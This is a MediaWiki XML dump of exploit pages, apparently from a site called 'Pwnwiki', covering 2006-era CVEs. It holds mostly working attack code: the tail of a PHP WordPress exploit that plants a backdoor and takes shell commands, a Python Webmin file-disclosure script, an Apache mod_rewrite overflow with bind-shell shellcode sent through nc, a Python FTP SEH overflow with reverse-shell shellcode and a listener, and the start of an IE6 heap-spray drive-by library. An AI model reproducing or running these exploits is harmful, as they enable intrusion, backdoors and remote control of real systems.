$data.="&amp;nickname=".urlencode(trim($username));
$data.="&amp;display_name=".urlencode(trim($username)).chr(13).$code."//suntzuu";
$data.="&amp;email=".urlencode("suntzu@suntzu.org");
$data.="&amp;url=".urlencode("http://");
$data.="&amp;aim=";
$data.="&amp;yim=";
$data.="&amp;jabber=";
$data.="&amp;description=whoami";
$data.="&amp;rich_editing=true";
$data.="&amp;submit=".urlencode("Update Profile &amp;raquo;");
$packet="POST ".$p."wp-admin/profile-update.php HTTP/1.0\r\n";
$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Referer: http://".$host.$path."wp-admin/profile-update.php\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (eregi("updated=true",$html)){echo "Done...\r\n";}
else {die("Unable to update profile...");}

echo "step 4 -&gt; go to profile page to avoid cached files deletion...\r\n";
$packet="GET ".$p."wp-admin/profile.php?updated=true HTTP/1.0\r\n";
$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: close\r\n\r\n";
sendpacketii($packet);
if (eregi("200 OK",$html)){echo "Done...\r\n";}
sleep(2);

echo "step 5 -&gt; check for an empty db password...\r\n";
$check=array("users/".md5($user_id).".php",
	     "userlogins/".md5(trim($username)).".php"
	     );
for ($i=0; $i&lt;=count($check)-1; $i++)
{
  $packet="GET ".$p."wp-content/cache/".$check[$i]." HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Cookie: cmd=".$cmd."\r\n";
  $packet.="Connection: close\r\n\r\n";
  sendpacketii($packet);
  if (eregi("*DL*",$html))
  {
    echo "Exploit succeeded...\r\n";$temp=explode("*DL*",$html);echo($temp[1]);echo"\r\nNow you can launch commands through the followig urls:\r\n http://".$host.$path."wp-content/cache/".$check[$i]."?cmd=ls%20-la\r\nalso, you should have a backdoor called suntzu.php in the same folder\r\n";die;
  }
}

if ($dict=='') {echo "exploit failed...\r\n";}
else
   {
    echo "step 6 -&gt; trying with dictionary attack...\r\n";
    if (file_exists($dict))
    {
      $fp=fopen($dict,"r");
      while (!feof($fp))
      {
        $word=trim(fgets($fp));
        $check=array("users/".md5($user_id.$word).".php",
	             "userlogins/".md5(trim($username).$word).".php"
	            );
        for ($i=0; $i&lt;=count($check)-1; $i++)
        {
	  echo "Trying with ".$check[$i]."\r\n";
          $packet="GET ".$p."wp-content/cache/".$check[$i]." HTTP/1.0\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Cookie: cmd=".$cmd."\r\n";
          $packet.="Connection: close\r\n\r\n";
          sendpacketii($packet);
          if (strstr($html,"*DL*"))
          {
            echo "Exploit succeeded...\r\n";fclose($fp);$temp=explode("*DL*",$html);echo $temp[1];echo"Now you can launch commands through the followig url:\r\n http://".$host.$path."wp-content/cache/".$check[$i]."?cmd=ls%20-la\r\nalso, you should have a backdoor called suntzu.php in the same folder\r\n";
	    die;
          }
        }
     }
     fclose($fp);
     //if you are here...
     echo "Exploit failed...\r\n";
   }
   else
   {
     die($dict."does not exist!");
   }
  }
?&gt;

# milw0rm.com [2006-05-25]
            
&lt;/pre&gt;</text>
      <sha1>8uodsk39csdhurceuen163kt71nrtzv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2006-3392 Webmin任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>614</id>
    <revision>
      <id>829</id>
      <timestamp>2021-04-01T02:44:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Exploit== &lt;pre&gt; #!/usr/bin/python3  # Exploit Title: Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure (Python3) # Exploit Author: Ziani Taha @0xtz # Vendor Homep..."</comment>
      <origin>829</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1227" sha1="csq5cmo8k6g976e3hrkrm7vf987uh4s" xml:space="preserve">==Exploit==
&lt;pre&gt;
#!/usr/bin/python3

# Exploit Title: Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure (Python3)
# Exploit Author: Ziani Taha @0xtz
# Vendor Homepage: http://www.webmin.com/
# Software Link: http://www.webmin.com/download.html
# Version: Webmin &lt; 1.290 / Usermin &lt; 1.220
# Tested on: Linux
# CVE : CVE-2006-3392

import argparse
import requests
import os

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help='HTTP or HTTPS', required=True, type=str)
parser.add_argument('-u', '--url',required=True, help='Server Url or IP adresse')
parser.add_argument('-p', '--port',required=True, type=int, help='Server port ex: 8080')
parser.add_argument('-f', '--file', required=True, help='File to read frome server',type=str)
args = parser.parse_args()

def main():
    payload = '/.%01' * 40
    #print(f'paylood:{payload}')
    url = (f'{args.target}://{args.url}:{args.port}/unauthenticated/{payload}{args.file}')
    print(url)
    r = requests.get(url)
    print('----------------------------------------------------------------\n')
    print(r.text)
    print('----------------------------------------------------------------\n')


if __name__ == '__main__':
    main()

&lt;/pre&gt;</text>
      <sha1>csq5cmo8k6g976e3hrkrm7vf987uh4s</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2006-3747 Apache 1.3拒絕服務漏洞</title>
    <ns>0</ns>
    <id>617</id>
    <revision>
      <id>832</id>
      <timestamp>2021-04-01T02:50:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Screenshot== [[File:Listado7.png | 500px]]  ==INFO== &lt;pre&gt; Files about my bugtraq publication and first working exploit for CVE-2006-3747 (Apache mod_rewrite LDAP off-by-one..."</comment>
      <origin>832</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5990" sha1="8brapmujm9o94fkgu0lm6epoxvjy6k6" xml:space="preserve">==Screenshot==
[[File:Listado7.png | 500px]]

==INFO==
&lt;pre&gt;
Files about my bugtraq publication and first working exploit for CVE-2006-3747 (Apache mod_rewrite LDAP off-by-one buffer overflow).

(http://www.securityfocus.com/archive/1/443870)

- Public release date of POC/Exploit: 2006-08-20
- Author: Jacobo Avariento Gimeno
- CVE id: CVE-2006-3747
- Bugtraq id: 19204
- CERT advisory: VU#395412
- Severity: high
- CVSS v2 Base Score: 7.6 HIGH (AV:N/AC:H/Au:N/C:C/I:C/A:C)

## Introduction

On July 28 2006 Mark Dowd (McAfee Avert Labs) reported a vulnerability
found in mod_rewrite apache module to the bugtraq mailing list.
The vulnerable function is escape_absolute_uri() and the problem only
could be arised when mod_rewrite is dealing with an LDAP URL, a
malformed LDAP URL could trigger an off-by-one overflow in certain
(special) situations and a possible attacker could cause a
denial-of-service or execute arbitrary code with the privileges of
the apache user.
To exploit this vulnerability isn't necessary an LDAP-specific rule,
but must have a rule which the user can control the inital part of the
remapped URL, i.e.:

```
RewriteRule foo/(.*) $1
```

Any version of the Apache HTTP server:
* 1.3 branch: &gt;1.3.28 and &lt;1.3.37
* 2.0 branch: &gt;2.0.46 and &lt;2.0.59
* 2.2 branch: &gt;2.2.0 and &lt;2.2.3
is vulnerable.


## Analysis of the vulnerable code

```
2696 /* escape absolute uri, which may or may not be path oriented.
2697 * So let's handle them differently.
2698 */
2699 static char *escape_absolute_uri(ap_pool *p, char *uri,
unsigned scheme)
2700 {
2701 char *cp;
2702 ...
...
2727 /* special thing for ldap.
2728 * The parts are separated by question marks. From RFC 2255:
2729 * ldapurl = scheme "://" [hostport] ["/"
2730 * [dn ["?" [attributes] ["?" [scope]
2731 * ["?" [filter] ["?" extensions]]]]]]
2732 */
2733 if (!strncasecmp(uri, "ldap", 4)) {
2734 char *token[5];
2735 int c = 0;
2736
2737 token[0] = cp = ap_pstrdup(p, cp);
2738 while (*cp &amp;&amp; c &lt; 5) {
2739 if (*cp == '?') {
2740 token[++c] = cp + 1;
2741 *cp = '\0';
2742 }
2743 ++cp;
2744 }
```

In the case that an LDAP URI contains a fifth '?' the line 2740 causes
an off-by-one overflow, it's writing in token[5].
To exploit this problem is necessary a vulnerable apache version and a
specific stack frame layout.

## Proof of concept

To know if your apache vulnerable version could be successful
exploited, write this rule in your httpd.conf or .htaccess file:

```
RewriteRule kung/(.*) $1

And try to access to the following URL:
/kung/ldap://localhost/AAAAAAAAAAAAAAAAAAAAA%3FAAAAAAAAAAAAA%
3FAAAAAAAAAAAAAAA%3FAAAAAAAAAA%3FAAAAAAAAAA%3FBBBBBBBBBBBBBB
```

If your web server doesn't reply you with a '302 Found' page or a
Segmentation Fault appears in your error_log, an apache child has
crashed and your web server is vulnerable and exploitable.

## Exploit

This exploit was successful executed on Apache 1.3.34, debian
sarge package:

```
#!/bin/sh
# Exploit for Apache mod_rewrite off-by-one.
# Vulnerability discovered by Mark Dowd.
# CVE-2006-3747
#
# by jack &lt;jack\x40gulcas\x2Eorg&gt;
# 2006-08-20
#
# Thx to xuso for help me with the shellcode.
#
# I suppose that you've the "RewriteRule kung/(.*) $1" rule if not
# you must recalculate adressess.
#
# Shellcode is based on Taeho Oh bindshell on port 30464 and modified
# for avoiding apache url-escape.. Take a look is quite nice ;)
#
# Shellcode address in heap memory on apache 1.3.34 (debian sarge) is at
# 0x0834ae77 for any other version/system find it.
#
# Gulcas rulez :P

echo -e "mod_rewrite apache off-by-one overflow\nby jack &lt;jack\x40gulcas
\x2eorg&gt;\n\n"

if [ $# -ne 1 ] ; then
echo "Usage: $0 webserver"
exit
fi

host=$1

echo -ne "GET /kung/ldap://localhost/`perl -e 'print "%90"x128'`%89%e6%
31%c0%31 %db%89%f1%b0%02%89%06%b0%01%89%46%04%b0%06%89%46%08%b0%66%b3%
01%cd%80%89%06%b0%02%66%89%46%0c%b0%77%66%89%46%0e%8d%46%0c%89%46%04%
31%c0%89%46%10%b0%10%89%46%08% b0%66%b3%02%cd%80%b0%01%89%46%04%b0%66%
b3%04%cd%80%31%c0%89%46%04%89%46%08%b0%66%b3%05%cd%80%88%c3%b0%3f%31%
c9%cd%80%b0%3f%b1%01%cd%80%b0%3f%b1%02%cd%80%b8%23%62%69%6e%89%06%b8%
23%73%68%23%89%46%04%31%c0%88%46%07%b0%30%2c%01%88%46%04%88%06%89%76%
08%31%c0%89%46%0c%b0%0b%89%f3%8d%4e%08%8d%56%0c%cd%80%31%c0%b0%01%31%db%

cd %80%3FC%3FC%3FCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC%
77%ae%34%08CCCCCCCCCCCCCCCCCCCCCCCCCCC%3FC%3F HTTP/1.1\r\nHost:
$host\r\n\r\n" | nc $host 80
```

~~ Jacobo Avariento Gimeno

&lt;/pre&gt;


==exploit.sh==
&lt;pre&gt;
#!/bin/sh
# Exploit for Apache mod_rewrite off-by-one.
# Vulnerability discovered by Mark Dowd.
# CVE-2006-3747
# 
# by jack &lt;jack\x40gulcas\x2Eorg&gt;
# 2006-08-20
#
# Thx to xuso for help me with the shellcode.
#
# I suppose that you've the "RewriteRule kung/(.*) $1" rule if not
# you must recalculate adressess.
#
# Shellcode is based on Taeho Oh bindshell on port 30464 and modified
# for avoiding apache url-escape.. Take a look is quite nice ;)
#
# Shellcode address in heap memory on apache 1.3.34 (debian sarge) is at
# 0x0834ae77 for any other version/system find it.
#
# Gulcas rulez :P

echo -e "mod_rewrite apache off-by-one overflow"
echo -e "by jack &lt;jack\x40gulcas\x2eorg&gt;\n\n"

if [ $# -ne 1 ] ; then
  echo "Usage: $0 webserver"
  exit
fi

host=$1

echo -ne "GET /kung/ldap://localhost/`perl -e 'print "%90"x128'`%89%e6\
%31%c0%31%db%89%f1%b0%02%89%06%b0%01%89%46%04%b0%06%89%46%08%b0%66%b3\
%01%cd%80%89%06%b0%02%66%89%46%0c%b0%77%66%89%46%0e%8d%46%0c%89%46%04\
%31%c0%89%46%10%b0%10%89%46%08%b0%66%b3%02%cd%80%b0%01%89%46%04%b0%66\
%b3%04%cd%80%31%c0%89%46%04%89%46%08%b0%66%b3%05%cd%80%88%c3%b0%3f%31\
%c9%cd%80%b0%3f%b1%01%cd%80%b0%3f%b1%02%cd%80%b8%23%62%69%6e%89%06%b8\
%23%73%68%23%89%46%04%31%c0%88%46%07%b0%30%2c%01%88%46%04%88%06%89%76\
%08%31%c0%89%46%0c%b0%0b%89%f3%8d%4e%08%8d%56%0c%cd%80%31%c0%b0%01%31%db\
%cd%80%3FC%3FC%3FCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\
%77%ae%34%08CCCCCCCCCCCCCCCCCCCCCCCCCCC%3FC%3F HTTP/1.1\r\n\
Host: $host\r\n\r\n" | nc $host 80

&lt;/pre&gt;</text>
      <sha1>8brapmujm9o94fkgu0lm6epoxvjy6k6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2006-3952 FTP Server 2.0任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>615</id>
    <revision>
      <id>830</id>
      <timestamp>2021-04-01T02:47:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # CVE-2006-3952 Exploit for Easy File Sharing FTP Server 3.5 on Win7 32   Based on: * pwntools * msfvenom / reverse\_tcp payload  Vulnerable app available at ht..."</comment>
      <origin>830</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6825" sha1="221j3pmm9m831qexvl6w66050sb7rrw" xml:space="preserve">==INFO==
&lt;pre&gt;
# CVE-2006-3952
Exploit for Easy File Sharing FTP Server 3.5 on Win7 32


Based on:
* pwntools
* msfvenom / reverse\_tcp payload

Vulnerable app available at https://www.exploit-db.com/apps/0efddb6d04f4125d7c1f104c6b1c60a0-efsfs.exe

Simple SEH overrite + couple jumps back, due to stack being corrupted after SEH value.

&lt;/pre&gt;


==exploit.py==
&lt;pre&gt;
#!/usr/bin/env python3
#
# Exploit for Easy File Sharing FTP Server 3.5 (CVE-2006-3952)
# * pwntools
# * metasploit reverse_tcp payload
# * Ropper

import sys
import pwn
from threading import Thread


# set target info
RHOST = '127.0.0.1'
RPORT = 21
LPORT = 4444


def generate_payload():
    NOP = pwn.asm("nop")  # noqa: F841
    payload = b""

    # msfvenom -f python -v shellcode -p windows/shell_reverse_tcp LHOST=192.168.0.151 LPORT=4444 EXITFUNC=thread -b "\x00" -e x86/alpha_mixed # noqa: E501
    shellcode = b""
    shellcode += b"\x89\xe3\xdb\xd9\xd9\x73\xf4\x5f\x57\x59\x49\x49"
    shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
    shellcode += b"\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
    shellcode += b"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
    shellcode += b"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
    shellcode += b"\x39\x6c\x38\x68\x6b\x32\x45\x50\x43\x30\x73\x30"
    shellcode += b"\x73\x50\x4c\x49\x6b\x55\x36\x51\x6f\x30\x71\x74"
    shellcode += b"\x6e\x6b\x50\x50\x54\x70\x4e\x6b\x46\x32\x64\x4c"
    shellcode += b"\x6e\x6b\x42\x72\x62\x34\x4e\x6b\x63\x42\x55\x78"
    shellcode += b"\x36\x6f\x4f\x47\x32\x6a\x54\x66\x66\x51\x59\x6f"
    shellcode += b"\x6e\x4c\x55\x6c\x65\x31\x53\x4c\x63\x32\x56\x4c"
    shellcode += b"\x71\x30\x7a\x61\x78\x4f\x64\x4d\x77\x71\x4b\x77"
    shellcode += b"\x7a\x42\x5a\x52\x66\x32\x31\x47\x4e\x6b\x52\x72"
    shellcode += b"\x54\x50\x6e\x6b\x52\x6a\x57\x4c\x6c\x4b\x30\x4c"
    shellcode += b"\x77\x61\x53\x48\x58\x63\x53\x78\x63\x31\x4b\x61"
    shellcode += b"\x30\x51\x6c\x4b\x62\x79\x51\x30\x65\x51\x69\x43"
    shellcode += b"\x4c\x4b\x72\x69\x44\x58\x49\x73\x76\x5a\x53\x79"
    shellcode += b"\x6e\x6b\x55\x64\x6e\x6b\x47\x71\x38\x56\x74\x71"
    shellcode += b"\x6b\x4f\x6c\x6c\x6a\x61\x68\x4f\x66\x6d\x55\x51"
    shellcode += b"\x4a\x67\x74\x78\x6b\x50\x34\x35\x39\x66\x37\x73"
    shellcode += b"\x31\x6d\x78\x78\x57\x4b\x71\x6d\x47\x54\x54\x35"
    shellcode += b"\x69\x74\x50\x58\x4c\x4b\x31\x48\x67\x54\x65\x51"
    shellcode += b"\x38\x53\x62\x46\x6c\x4b\x36\x6c\x52\x6b\x6c\x4b"
    shellcode += b"\x63\x68\x57\x6c\x75\x51\x69\x43\x6e\x6b\x74\x44"
    shellcode += b"\x4c\x4b\x43\x31\x4a\x70\x4f\x79\x47\x34\x51\x34"
    shellcode += b"\x61\x34\x33\x6b\x63\x6b\x45\x31\x63\x69\x51\x4a"
    shellcode += b"\x36\x31\x79\x6f\x79\x70\x43\x6f\x71\x4f\x30\x5a"
    shellcode += b"\x4c\x4b\x67\x62\x78\x6b\x6e\x6d\x71\x4d\x71\x78"
    shellcode += b"\x57\x43\x47\x42\x37\x70\x73\x30\x33\x58\x30\x77"
    shellcode += b"\x74\x33\x64\x72\x61\x4f\x73\x64\x31\x78\x52\x6c"
    shellcode += b"\x54\x37\x51\x36\x36\x67\x39\x6f\x4a\x75\x6f\x48"
    shellcode += b"\x4c\x50\x77\x71\x73\x30\x63\x30\x66\x49\x49\x54"
    shellcode += b"\x62\x74\x50\x50\x61\x78\x67\x59\x6d\x50\x62\x4b"
    shellcode += b"\x73\x30\x39\x6f\x68\x55\x50\x50\x76\x30\x72\x70"
    shellcode += b"\x46\x30\x63\x70\x30\x50\x31\x50\x52\x70\x31\x78"
    shellcode += b"\x58\x6a\x44\x4f\x39\x4f\x79\x70\x69\x6f\x5a\x75"
    shellcode += b"\x6a\x37\x50\x6a\x44\x45\x35\x38\x4f\x30\x59\x38"
    shellcode += b"\x53\x30\x6e\x77\x33\x58\x63\x32\x35\x50\x36\x71"
    shellcode += b"\x33\x6c\x6d\x59\x69\x76\x70\x6a\x56\x70\x36\x36"
    shellcode += b"\x61\x47\x61\x78\x4c\x59\x69\x35\x34\x34\x30\x61"
    shellcode += b"\x69\x6f\x7a\x75\x6f\x75\x6b\x70\x34\x34\x64\x4c"
    shellcode += b"\x69\x6f\x50\x4e\x57\x78\x72\x55\x38\x6c\x71\x78"
    shellcode += b"\x38\x70\x6e\x55\x6e\x42\x36\x36\x39\x6f\x6e\x35"
    shellcode += b"\x51\x78\x55\x33\x70\x6d\x50\x64\x45\x50\x6c\x49"
    shellcode += b"\x48\x63\x61\x47\x62\x77\x50\x57\x46\x51\x39\x66"
    shellcode += b"\x53\x5a\x55\x42\x63\x69\x71\x46\x59\x72\x69\x6d"
    shellcode += b"\x61\x76\x39\x57\x47\x34\x35\x74\x67\x4c\x36\x61"
    shellcode += b"\x43\x31\x6c\x4d\x47\x34\x64\x64\x66\x70\x69\x56"
    shellcode += b"\x77\x70\x57\x34\x73\x64\x62\x70\x32\x76\x62\x76"
    shellcode += b"\x52\x76\x33\x76\x56\x36\x42\x6e\x30\x56\x42\x76"
    shellcode += b"\x63\x63\x43\x66\x55\x38\x70\x79\x68\x4c\x55\x6f"
    shellcode += b"\x4b\x36\x59\x6f\x78\x55\x6d\x59\x4d\x30\x32\x6e"
    shellcode += b"\x61\x46\x62\x66\x69\x6f\x66\x50\x72\x48\x67\x78"
    shellcode += b"\x4b\x37\x37\x6d\x63\x50\x39\x6f\x6b\x65\x4f\x4b"
    shellcode += b"\x6b\x50\x37\x6d\x36\x4a\x74\x4a\x75\x38\x4e\x46"
    shellcode += b"\x6a\x35\x6d\x6d\x6d\x4d\x6b\x4f\x38\x55\x37\x4c"
    shellcode += b"\x46\x66\x33\x4c\x65\x5a\x6d\x50\x4b\x4b\x69\x70"
    shellcode += b"\x54\x35\x45\x55\x4d\x6b\x31\x57\x75\x43\x74\x32"
    shellcode += b"\x30\x6f\x61\x7a\x33\x30\x52\x73\x39\x6f\x39\x45"
    shellcode += b"\x41\x41"

    payload += b"," * 900  # required to trigger an exception
    payload += NOP * 560
    payload += shellcode  # stage 3
    payload += NOP * (2555 - len(payload))
    payload += pwn.asm("jmp $-1300")  # stage 2, jump even further to stage3
    PPR_GADGET = pwn.p32(0x10012ff2)  # add esp, 8; ret from ssleay32.dll
    payload += pwn.asm("jmp $-5; nop; nop")  # trampoline to jump further backward to stage2
    payload += PPR_GADGET
    payload += NOP * (4000 - len(payload))

    return payload


def attack():
    r = pwn.remote(RHOST, RPORT, typ="tcp")
    print(r.recv(1024))
    r.send("USER ftptest\r\n")
    print(r.recv(1024))
    p = b"PASS %b\r\n" % generate_payload()
    print(p)
    r.send(p)


if __name__ == "__main__":
    if len(sys.argv) &gt; 1:
        RHOST = sys.argv[1]

    thread = Thread(target=attack)
    thread.start()

    listener = pwn.listen(port=LPORT)
    listener.wait_for_connection()
    listener.interactive()

    thread.join()

&lt;/pre&gt;

==fuzz.py==
&lt;pre&gt;
#!/usr/bin/env python
from boofuzz import *
import sys


def hello(target, logger, session, *args, **kwargs):
    try:
        banner = target.recv(1000)
    except Exception:
        logger.log_info("Target down. Exiting.")
        sys.exit(-1)

    logger.log_check("Banner received")
    if not banner.startswith("220 Welcome to Easy File Sharing FTP Server!"):
        logger.log_fail("Incorrect banner: {}".format(banner))
        sys.exit(-2)


def main():
    session = Session(
            target=Target(connection=SocketConnection("192.168.0.101", 21, proto='tcp')),
            )

    s_initialize(name="Command")
    s_static("USER ftptest\r\n")
    s_static("PASS ")
    s_string("1")
    s_static("\r\n")

    session.connect(s_get("Command"), callback=hello)

    session.fuzz()


if __name__ == "__main__":
    main()

&lt;/pre&gt;</text>
      <sha1>221j3pmm9m831qexvl6w66050sb7rrw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2006-4777 Internet Explorer 6.0 SP1緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>623</id>
    <revision>
      <id>840</id>
      <timestamp>2021-04-01T03:18:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; # js-driveby-download-CVE-2006-4777 malware del lado del cliente de explotacion de vulnerabilidad de internet explorer 6.0 SP1 en windows xp SP2.  No requiere d..."</comment>
      <origin>840</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="10155" sha1="28s1rkm2zpmlsdn4ps49ka1645cuqr9" xml:space="preserve">==INFO==
&lt;pre&gt;
# js-driveby-download-CVE-2006-4777
malware del lado del cliente de explotacion de vulnerabilidad de internet explorer 6.0 SP1 en windows xp SP2. 
No requiere de consentimiento por parte del usuario y no descarga ningun archivo.
Injeccion de Codigo Shell en la RAM desde JavaScript con IE en Windows XP.

Fileless, drive-by-download, client side malware.

&lt;/pre&gt;


==PilaLib.js==
&lt;pre&gt;
function pilaLib() {
}

pilaLib.ie.prototype.cadenaHex = function(numeroHexadecimal, anchoBytes)
{
    var digitos = "0123456789ABCDEF";
    var cadenaHexadec = digitos.substr(numeroHexadecimal &amp; 0xF, 1);
    while (numeroHexadecimal &gt; 0xF) {
        numeroHexadecimal = numeroHexadecimal &gt;&gt;&gt; 4;
        cadenaHexadec = digitos.substr(numeroHexadecimal &amp; 0xF, 1) + cadenaHexadec;
    }
    var anchoBytes = (anchoBytes ? anchoBytes : 0);
    while (cadenaHexadec.length &lt; anchoBytes)
        cadenaHexadec = "0" + cadenaHexadec;
    return cadenaHexadec;
}

pilaLib.ie.prototype.direccion = function(direccion) {
    return unescape("%u" + this.cadenaHex(direccion &amp; 0xFFFF, 4) + "%u" + this.cadenaHex((direccion &gt;&gt; 16) &amp; 0xFFFF, 4));
}

pilaLib.ie.prototype.escribeInts32Bits = function(numeroBytesBloque, etiquetaBloque) {
    var tamanio;
    // Calculate the allocation size
    if (typeof numeroBytesBloque == "string" || numeroBytesBloque instanceof String)
        tamanio = 4 + numeroBytesBloque.length*2 + 2;    // len + string data + null terminator
    else
        tamanio = numeroBytesBloque;
    // Make sure that the size is valid
    if ((tamanio &amp; 0xf) != 0)
        throw "Allocation size " + tamanio + " must be a multiple of 16";
    // Create an array for this tag if doesn't already exist
    if (this.memoria[etiquetaBloque] === undefined)
        this.memoria[etiquetaBloque] = new Array();
    if (typeof numeroBytesBloque == "string" || numeroBytesBloque instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.memoria[etiquetaBloque].push(numeroBytesBloque.substr(0, numeroBytesBloque.length));
    }
    else {
        // Allocate the block
        this.memoria[etiquetaBloque].push(this.rellena((numeroBytesBloque-6)/2));
    }
}

pilaLib.ie.prototype.liberaInts32Bits = function(etiqueta) {
    delete this.memoria[etiqueta];
    
    // Run the garbage collector
    CollectGarbage();
}

pilaLib.ie.prototype.limpiaCache = function() {
    this.depur("Flushing the OLEAUT32 cache");
    // Free the maximum size blocks and push out all smaller blocks
    this.liberaInts32Bits("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache
    for (var i = 0; i &lt; 6; i++) {
        this.escribeInts32Bits(32, "oleaut32");
        this.escribeInts32Bits(64, "oleaut32");
        this.escribeInts32Bits(256, "oleaut32");
        this.escribeInts32Bits(32768, "oleaut32");
    }
}

//perdemos la referencia al objeto o string, pero su contenido queda guardado en memoria y reubicado por el recol basur
pilaLib.ie.prototype.libera = function(etiqueta) {
    // Free the blocks with the OLEAUT32 free function
    this.liberaInts32Bits(etiqueta);
    // Flush the OLEAUT32 cache
    this.limpiaCache();
}

//----------------------------------------------------------
//----------------------PUBLICAS----------------------------

pilaLib.ie.prototype.recolectorBasura = function() {
	CollectGarbage();
    this.limpiaCache();
}

pilaLib.ie = function(tamanioBloqueMaximo, basePila) {
    this.tamanioBloqueMaximo = (tamanioBloqueMaximo ? tamanioBloqueMaximo : 65535);
    this.basePila = (basePila ? basePila : 0x150000);
    // Allocate a padding string that uses maxAlloc bytes
    this.textoRelleno = "AAAA";
    while (4 + this.textoRelleno.length*2 + 2 &lt; this.tamanioBloqueMaximo) {
        this.textoRelleno += this.textoRelleno;
    }
    
    // Create an array for storing references to allocated memory
    this.memoria = new Array();
    // Call flushOleaut32() once to allocate the maximum size blocks
    this.limpiaCache();
}

pilaLib.ie.prototype.rellena = function(longitud) {
    if (longitud &gt; this.textoRelleno.length)
        throw "Requested padding string length " + longitud + ", only " + this.textoRelleno.length + " available";
    return this.textoRelleno.substr(0, longitud);
}

//en C++ los objetos se guardan en una lista de nodos de 48 bytes que se llaman lista de tablas virtuales
pilaLib.ie.prototype.creaPunteroListaTablas = function(cadenaTablaVirtual)
{
    var tamanio;
    // Calculate the allocation size
    if (typeof cadenaTablaVirtual == "string" || cadenaTablaVirtual instanceof String)
        tamanio = 4 + cadenaTablaVirtual.length*2 + 2;    // len + string data + null terminator
    else
        tamanio = cadenaTablaVirtual;
    // Make sure that the size is valid
    if ((tamanio &amp; 0xf) != 0)
        throw "Allocation size " + tamanio + " must be a multiple of 16";
    if (tamanio+8 &gt;= 1024)
        throw("Maximum lookaside block tamanio is 1008 bytes");
    // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.
	
	//la lista de tablas contiene paquetes, en cada uno se guarda una tabla y su cabecera aniadida de 8 bytes
	//cada paquete tiene x nodos(es su representacion en memoria).cada nodo es de 48 bytes y guarda solo un marco de su paquete
	//Un marco son 8 bytes del paquete, asi que un supuesto paquete de 16 bytes = 8tabla+8cabecera tendria dos nodos, 
	//cada uno guardaria un marco de 8bytes, el primer nodo guardaria el marco con la info de la tabla y el segundo el marco con la cabecera
	//ademas cada nodo guarda informacion extra que no nos importa(esos 40 bytes extra)
	//es decir, un paquete ocupa = tamanioTabla+8(cabecera) =  en este caso 1016bytes = tamanioPaqueteB
	//y se guarda en memoria en marcos de 8bytes, tamanioPaqueteM = tamanioPaqueteB/8 = 127 marcos
	//y estos se guardan en nodos de tamanioNodo=tamanioPaqueteM*48 = en este caso 6096 bytes
	//asi la lista de nodos ocupa = ((tamanioTabla+8)/8)*48 bytes
    return this.basePila + 0x688 + ((tamanio+8)/8)*48;
}

//crea un objeto falso con codigo ensamblador que ejecuta el codigo concha
pilaLib.ie.prototype.creaTabVirt = function(codigoConcha, direccionSaltoEjecucion, tamanio) {
    var tamanio = (tamanio ? tamanio : 1008);
    //asegura que el tamanio de la tabla es valido
    if ((tamanio &amp; 0xf) != 0)
        throw "el tamanio de la Vtable " + tamanio + " debe ser multiplo de 16";
    if (codigoConcha.length*2 &gt; tamanio-138)
        throw("el tamanio maximo del codigo concha es " + (tamanio-138) + " bytes");
    //Construye la tabla virtual que ira emplazada en nuestra lista tablas virtuales de bloques de 1008
    //
    //funcionSuma = add[eax]; add[eax]         funcionResta = sub[eax], al;sub[eax], al      funcionSalto=nop, nop, [exc+8]+124
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes
    // funcionSuma  funcionSalto  31xdirSalto   funcionResta  shellcode+relleno  null
    // 124bytes tienen la dir de salto 31 veces repetida y seguida
	
	// 3 funciones para ejecutar el salto: nop, nop, [exc+8]+124
    var tablaVirtual = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124
